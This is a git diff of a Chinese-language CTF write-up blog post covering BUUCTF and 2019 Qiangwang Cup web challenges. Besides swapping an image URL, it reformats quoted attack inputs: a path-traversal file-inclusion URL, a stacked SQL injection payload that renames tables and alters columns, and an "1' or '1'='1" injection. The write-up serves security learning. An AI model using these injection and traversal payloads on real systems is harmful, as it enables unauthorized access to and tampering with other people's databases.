@@ -6,7 +6,7 @@ categories:
 tags:
   - Write-up
 comments: true
-img: 'https://i.loli.net/2019/07/17/5d2eee078bec383668.png'
+img: 'https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200824172833.png'
 abbrlink: 9796
 date: 2019-08-28 11:28:43
 ---
@@ -146,6 +146,7 @@ emmm::checkFile($_REQUEST[‘file’])返回值为真。
 
 **playload**:`http://10d57afd-7622-4cda-b0be-af3d90f1cce0.node1.buuoj.cn/?file=source.php%253f/../../../../ffffllllaaaagggg`
 ### 随便注(三种解题思路)【2019-强网杯】
+
 **知识点**：SQL注入-堆叠注入,sql预处理语句,巧用contact()函数绕过
 **参考**：
 [SQL注入-堆叠注入](https://www.cnblogs.com/0nth3way/articles/7128189.html)
@@ -218,10 +219,15 @@ eg:`mysql>SELECT * FROM   `table`   WHERE `from` = 'abc' ;
 他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。
 先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。
 **payload:**
-``1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#``
+
+```sql
+1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#
+```
+
 ![](https://i.loli.net/2019/08/28/miPt4rXApufY9G2.png)
-接着输入`1' or '1'='1 #`,查询就得到flag
+接着输入`1' or '1'='1 `,查询就得到flag
 ![](https://i.loli.net/2019/08/28/r5gcJfmvNEWAZ7V.png)
+
 #### 方法二：预处理语句+堆叠注入
 预处理语句使用方式：
 ```sql
